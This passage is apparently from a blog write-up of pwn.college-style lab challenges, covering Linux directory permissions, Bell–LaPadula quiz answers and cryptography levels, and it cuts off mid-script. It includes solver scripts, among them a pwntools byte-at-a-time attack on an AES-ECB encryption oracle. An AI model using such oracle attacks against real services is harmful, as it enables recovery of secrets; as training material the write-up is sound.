5 23:25 .cc.txt<br>-rw-r--r-- 1 root   root            55 Sep  1 01:16 .crates.toml<br>-rw-r--r-- 1 root   root           453 Sep  1 01:16 .crates2.json<br>drwxr-xr-x 2 hacker hacker        4096 Sep  1 07:45 .dojo<br>drwxr-xr-x 2 root   root          4096 Sep  1 01:16 bin<br>drwxr-xr-x 1 root   root          4096 Aug  5 23:22 hsperfdata_root<br>drwx------ 2    104           105 4096 Aug 27 04:47 tmp.gzrsgdiMSN<br>dr-xr-x--x 2 root   user_betcpnye 4096 Sep  1 07:45 tmpr_j9uk3r<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su user_betcpnye</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /tmp/tmpr_j9uk3r</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su user_qydwicsg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /tmp/tmpr_j9uk3r/xxx</span><br></code></pre></td></tr></table></figure><h4 id="level12-2"><a href="#level12-2" class="headerlink" title="level12"></a>level12</h4><blockquote><p>Find the flag using multiple users</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how UNIX permissions for directories work with multiple users.<br>You&#x27;ll be given access to various user accounts, use su to switch between them.<br><br>Created user user_wavnhyls with password jnfksrwp<br>Created user user_ocqiyufq with password vmljvdoc<br>Created user user_npddlxea with password rtdytofy<br>A copy of the flag has been placed somewhere in /tmp:<br>total 40<br>drwxrwxrwt 1 root   root          4096 Sep  1 07:48 .<br>drwxr-xr-x 1 root   root          4096 Sep  1 07:47 ..<br>-rw-rw-r-- 1 root   root             4 Aug  5 23:25 .cc.txt<br>-rw-r--r-- 1 root   root            55 Sep  1 01:16 .crates.toml<br>-rw-r--r-- 1 root   root           453 Sep  1 01:16 .crates2.json<br>drwxr-xr-x 2 hacker hacker        4096 Sep  1 07:47 .dojo<br>drwxr-xr-x 2 root   root          4096 Sep  1 01:16 bin<br>drwxr-xr-x 1 root   root          4096 Aug  5 23:22 hsperfdata_root<br>drwx------ 2    104           105 4096 Aug 27 04:47 tmp.gzrsgdiMSN<br>dr-xr-x--x 3 root   user_wavnhyls 4096 Sep  1 07:48 tmp9wu15dcc<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su user_wavnhyls</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /tmp/tmp9wu15dcc</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su xxx-2</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /tmp/tmpxxx/tmpxxx</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su xxx-3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /tmp/tmpxxx/tmpxxx/xxx</span> <br></code></pre></td></tr></table></figure><h4 id="level13-2"><a href="#level13-2" class="headerlink" title="level13"></a>level13</h4><blockquote><p>One Mandatory Access Control question without categories</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you&#x27;ll be answering questions about the standard Bell–LaPadula model of Mandatory Access Control.<br><br>Answer the question about the model to get the flag.<br><br><br>In this challenge, your goal is to answer 1 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:<br>4 Levels (first is highest aka more sensitive):<br>TS<br>S<br>C<br>UC<br>Q 1. Can a Subject with level UC read an Object with level UC?<br>yes<br>Correct!<br>Congratulations, you solved this challenge!<br><br></code></pre></td></tr></table></figure><h4 id="level14-1"><a href="#level14-1" class="headerlink" title="level14"></a>level14</h4><blockquote><p>Five Mandatory Access Control questions without categories</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this series of challenges, you will be working with various access control systems.<br>Break the system to get the flag.<br><br><br>In this challenge you&#x27;ll be answering questions about the standard Bell–LaPadula model of Mandatory Access Control.<br><br>Answer the questions about the model to get the flag.<br><br><br>In this challenge, your goal is to answer 5 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:<br>4 Levels (first is highest aka more sensitive):<br>TS<br>S<br>C<br>UC<br>Q 1. Can a Subject with level S write an Object with level S?<br>yes<br>Correct!<br>Q 2. Can a Subject with level S read an Object with level UC?<br>yes<br>Correct!<br>Q 3. Can a Subject with level C write an Object with level S?<br>yes<br>Correct!<br>Q 4. Can a Subject with level S write an Object with level TS?<br>yes<br>Correct!<br>Q 5. Can a Subject with level TS read an Object with level TS?<br>yes<br>Correct!<br>Congratulations, you solved this challenge!<br><br></code></pre></td></tr></table></figure><h4 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h4><blockquote><p>One Mandatory Access Control question with categories</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you&#x27;ll be answering questions about the category-based Bell–LaPadula model of Mandatory Access Control.<br><br>Answer the question about the model to get the flag.<br><br><br>In this challenge, your goal is to answer 1 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:<br>4 Levels (first is highest aka more sensitive):<br>TS<br>S<br>C<br>UC<br>4 Categories:<br>NUC<br>NATO<br>UFO<br>ACE<br>Q 1. Can a Subject with level UC and categories &#123;UFO&#125; read an Object with level UC and categories &#123;NATO, UFO, ACE&#125;?<br>no<br>Correct!<br>Congratulations, you solved this challenge!<br></code></pre></td></tr></table></figure><h4 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h4><blockquote><p>Five Mandatory Access Control questions with categories</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you&#x27;ll be answering questions about the category-based Bell–LaPadula model of Mandatory Access Control.<br><br>Answer the questions about the model to get the flag.<br><br><br>In this challenge, your goal is to answer 5 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:<br>4 Levels (first is highest aka more sensitive):<br>TS<br>S<br>C<br>UC<br>4 Categories:<br>ACE<br>NATO<br>NUC<br>UFO<br>Q 1. Can a Subject with level C and categories &#123;NATO, UFO&#125; write an Object with level C and categories &#123;ACE, UFO&#125;?<br>no<br>Correct!<br>Q 2. Can a Subject with level UC and categories &#123;NATO, UFO&#125; write an Object with level UC and categories &#123;ACE, NATO, UFO&#125;?<br>yes<br>Correct!<br>Q 3. Can a Subject with level C and categories &#123;NATO, NUC, UFO&#125; write an Object with level TS and categories &#123;ACE, NATO&#125;?<br>no<br>Correct!<br>Q 4. Can a Subject with level UC and categories &#123;NUC&#125; write an Object with level TS and categories &#123;NUC&#125;?<br>yes<br>Correct!<br>Q 5. Can a Subject with level TS and categories &#123;NATO, NUC&#125; write an Object with level TS and categories &#123;NATO&#125;?<br>no<br>Correct!<br>Congratulations, you solved this challenge!<br></code></pre></td></tr></table></figure><h4 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h4><blockquote><p>Automate answering 20 Mandatory Access Control questions with categories in one second</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you&#x27;ll be answering many questions about the category-based Bell–LaPadula model of Mandatory Access Control.<br><br>Hint: Use pwntools to interact with this process and answer the questions.<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>p = process(<span class="hljs-string">&quot;/challenge/run&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;system:\n&#x27;</span>)<br><br>level_line = p.recvline()<br>level_number = <span class="hljs-built_in">int</span>(level_line.split(<span class="hljs-string">b&#x27; &#x27;</span>)[<span class="hljs-number">0</span>])<br>level = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,level_number):<br>    level[p.recvline()[:-<span class="hljs-number">1</span>].decode()] = i<br><br>Categories_line = p.recvline()<br>Categories_number = <span class="hljs-built_in">int</span>(Categories_line.split(<span class="hljs-string">b&#x27; &#x27;</span>)[<span class="hljs-number">0</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,Categories_number):<br>    Cur_Categories = p.recvline()[:-<span class="hljs-number">1</span>].decode()<br>    <span class="hljs-built_in">exec</span>(Cur_Categories+<span class="hljs-string">f&quot; = <span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br><br>pattern = <span class="hljs-string">r&quot;(?:Can a Subject with level )(.*)(?: and categories )(&#123;.*&#125;)(?: )(.*)(?: an Object with level )(.*)(?: and categories )(&#123;.*&#125;)?&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">judge</span>(<span class="hljs-params">q</span>):<br>    res = re.findall(pattern,q.decode())<br>    method = res[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]<br>    level1 = res[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>    level2 = res[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>]<br>    cate1 = <span class="hljs-built_in">set</span>(<span class="hljs-built_in">eval</span>(res[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]))<br>    cate2 = <span class="hljs-built_in">set</span>(<span class="hljs-built_in">eval</span>(res[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>]))<br><br>    <span class="hljs-keyword">if</span>(method == <span class="hljs-string">&#x27;read&#x27;</span>):<br>        <span class="hljs-keyword">if</span> level[level1] &gt; level[level2]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cate2.issubset(cate1):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> level[level1] &lt; level[level2]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cate1.issubset(cate2):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    q = p.recvline()<br>    <span class="hljs-built_in">print</span>(q.decode(),end = <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations&#x27;</span> <span class="hljs-keyword">in</span> q:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> judge(q):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;yes&#x27;</span>)<br>        p.sendline(<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;no&#x27;</span>)<br>        p.sendline(<span class="hljs-string">b&#x27;no&#x27;</span>)<br>    feedback = p.recvline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Incorrect&#x27;</span> <span class="hljs-keyword">in</span> feedback:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>)<br>        exit(-<span class="hljs-number">1</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h4><blockquote><p>Automate answering 64 Mandatory Access Control questions with categories in one second</p></blockquote><p>same with levle17<br>同上</p><h4 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h4><blockquote><p>Automate Answering 128 Mandatory Access Control questions with random levels and categories in one second</p></blockquote><p>same with levle17<br>同上</p><h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge"></a>challenge</h3><p>In this series of challenges, you will be working with various cryptographic mechanisms.</p><h4 id="level1-3"><a href="#level1-3" class="headerlink" title="level1"></a>level1</h4><blockquote><p>Decode base64-encoded data</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will decode base64 data.<br>Despite base64 data appearing &quot;mangled&quot;, it is not an encryption scheme.<br>It is an encoding, much like base2, base10, base16, and ascii.<br>It is a popular way of encoding raw bytes.<br></code></pre></td></tr></table></figure><h4 id="level2-3"><a href="#level2-3" class="headerlink" title="level2"></a>level2</h4><blockquote><p>Decrypt a secret encrypted with a one-time pad, assuming a securely transferred key</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will decrypt a secret encrypted with a one-time pad.<br>Although simple, this is the most secure encryption mechanism, if you could just securely transfer the key.<br><br><br>key (b64): HRjtTI18KTXXpoh9pX1zgxFP+ZxZouUMBnzRRSHEstzHaCFCpFiO2y9HQZg1K3a3rCVnLIbc12YtKg==<br>secret ciphertext (b64): bW+DYu4TRVmywe0G9B4ptkYIuMwP16xgRRj8IxWD/bnyMFA3kGnH9UsVO9ZPZjL7mXQdYv+FrTFQIA==<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>key = <span class="hljs-string">&quot;HRjtTI18KTXXpoh9pX1zgxFP+ZxZouUMBnzRRSHEstzHaCFCpFiO2y9HQZg1K3a3rCVnLIbc12YtKg==&quot;</span><br>secret = <span class="hljs-string">&quot;bW+DYu4TRVmywe0G9B4ptkYIuMwP16xgRRj8IxWD/bnyMFA3kGnH9UsVO9ZPZjL7mXQdYv+FrTFQIA==&quot;</span><br><br>key = base64.b64decode(key)<br>secret = base64.b64decode(secret)<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    flag+= <span class="hljs-built_in">chr</span>(secret[i]^key[i])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h4 id="level3-3"><a href="#level3-3" class="headerlink" title="level3"></a>level3</h4><blockquote><p>Decrypt a secret encrypted with a one-time pad, where the key is reused for arbitrary data</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will decrypt a secret encrypted with a one-time pad.<br>You can encrypt arbitrary data, with the key being reused each time.<br><br><br>secret ciphertext (b64): B1F6vDejRjt6Z4ZbU1lAXl2Ji7LRbFISvHJ46fPojbPwZc7gYAk2NQHHMulAPmOHB0hFH9wce0VpAA==<br>plaintext (b64): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==<br>ciphertext (b64): dyYUklTMKlcfAOMgCjsvCCTM4MqHCDtZyjABvrqr2+ahIKu1AltjG2WRSKc6cyfLMhk/UaVFARIUCg==<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>secret = <span class="hljs-string">&#x27;B1F6vDejRjt6Z4ZbU1lAXl2Ji7LRbFISvHJ46fPojbPwZc7gYAk2NQHHMulAPmOHB0hFH9wce0VpAA==&#x27;</span><br>secret = base64.b64decode(secret)<br><br><span class="hljs-built_in">print</span>(base64.b64encode(<span class="hljs-string">b&#x27;\0&#x27;</span>*<span class="hljs-built_in">len</span>(secret)))<br><span class="hljs-comment"># AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==</span><br><br>key = <span class="hljs-string">&quot;dyYUklTMKlcfAOMgCjsvCCTM4MqHCDtZyjABvrqr2+ahIKu1AltjG2WRSKc6cyfLMhk/UaVFARIUCg==&quot;</span><br>key = base64.b64decode(key)<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    flag+= <span class="hljs-built_in">chr</span>(secret[i]^key[i])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h4 id="level4-3"><a href="#level4-3" class="headerlink" title="level4"></a>level4</h4><blockquote><p>Decrypt a secret encrypted with AES using the ECB mode of operation</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will decrypt a secret encrypted with Advanced Encryption Standard (AES).<br>The Electronic Codebook (ECB) block cipher mode of operation is used.<br><br><br>key (b64): N0EJNox2NpWKmu2HM2bYRg==<br>secret ciphertext (b64): cg56PmUGqzUdt/Ai1MNZP4XLMypLuY+57rG5wbrUOWP3zPdtpRt5vqZe2tP67Pmrz4/h2+C8tLvXzjO73wbU/w==<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br>key = <span class="hljs-string">&quot;N0EJNox2NpWKmu2HM2bYRg==&quot;</span><br>secret = <span class="hljs-string">&quot;cg56PmUGqzUdt/Ai1MNZP4XLMypLuY+57rG5wbrUOWP3zPdtpRt5vqZe2tP67Pmrz4/h2+C8tLvXzjO73wbU/w==&quot;</span><br>key = base64.b64decode(key)<br>secret = base64.b64decode(secret)<br><br>aes = AES.new(key, AES.MODE_ECB )<br><br><span class="hljs-built_in">print</span>(aes.decrypt(secret))<br></code></pre></td></tr></table></figure><h4 id="level5-3"><a href="#level5-3" class="headerlink" title="level5"></a>level5</h4><blockquote><p>Decrypt a secret encrypted with AES-ECB, where arbitrary data is appended to the secret and the key is reused. This level is quite a step up in difficulty (and future levels currently do not build on this level), so if you are completely stuck feel free to move ahead. Check out this lecture video on how to approach level 5.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will decrypt a secret encrypted with Advanced Encryption Standard (AES).<br>The Electronic Codebook (ECB) block cipher mode of operation is used.<br>You can encrypt arbitrary data, which has the secret appended to it, with the key being reused each time.<br><br><br>secret ciphertext (b64): z+IDlVYk0Dn3Hclscr9Crl+FRhl/kopRq7U/Sgt9Y80FS/Hf/A1/fb+L4cCRMv48DQnUwESEGmMNfctJzVU7Vg==<br>secret ciphertext (hex): cfe203955624d039f71dc96c72bf42ae 5f8546197f928a51abb53f4a0b7d63cd 054bf1dffc0d7f7dbf8be1c09132fe3c 0d09d4c044841a630d7dcb49cd553b56<br>plaintext prefix (b64): <br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>p = process(<span class="hljs-string">&quot;/challenge/run&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_encrypt</span>(<span class="hljs-params">plaintext</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;plaintext prefix (b64): &#x27;</span>)<br>    p.sendline(base64.b64encode(plaintext))<br>    p.recvuntil(<span class="hljs-string">b&#x27;ciphertext (b64): &#x27;</span>)<br>    cipher = base64.b64decode(p.recvline()[:-<span class="hljs-number">1</span>])<br>    p.recvuntil(<span class="hljs-string">b&#x27;ciphertext (hex): &#x27;</span>)<br>    hexcipher = (p.recvline()[:-<span class="hljs-number">2</span>].decode()).split(<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-keyword">return</span> cipher,hexcipher<br><br>secret = aes_encrypt(<span class="hljs-string">b&quot;&quot;</span>)<br>flag_len = <span class="hljs-built_in">len</span>(secret[<span class="hljs-number">0</span>])<br><br>padding_test = aes_encrypt(<span class="hljs-string">b&#x27;\x10&#x27;</span>*<span class="hljs-number">16</span>)<br><span class="hljs-keyword">if</span> padding_test[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]==secret[<span class="hljs-number">1</span>][-<span class="hljs-number">1</span>]:<br>    flag_padding = <span class="hljs-number">16</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">16</span>):<br>        res = aes_encrypt(<span class="hljs-string">b&#x27;a&#x27;</span>*i)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(res[<span class="hljs-number">0</span>]) &gt; flag_len:<br>            flag_padding = i<br>            <span class="hljs-keyword">break</span><br><br>flag_len -= flag_padding<br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(flag_len):<br>    block = (i+<span class="hljs-number">1</span>)//<span class="hljs-number">16</span> + <span class="hljs-number">1</span><br>    target = aes_encrypt(<span class="hljs-string">b&#x27;a&#x27;</span>*(flag_padding+i+<span class="hljs-number">1</span>))<br>    round_success = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>        senddata = <span class="hljs-built_in">chr</span>(j)+flag[:<span class="hljs-number">15</span>]<br>        senddata = pad(senddata.encode(),<span class="hljs-number">16</span>)<br>        res = aes_encrypt(senddata) <br>        <span class="hljs-keyword">if</span> res[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]==target[<span class="hljs-number">1</span>][-block]:<br>            flag = <span class="hljs-built_in">chr</span>(j)+flag<br>            round_success = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> round_success==<span class="hljs-literal">False</span>:<br>        <span 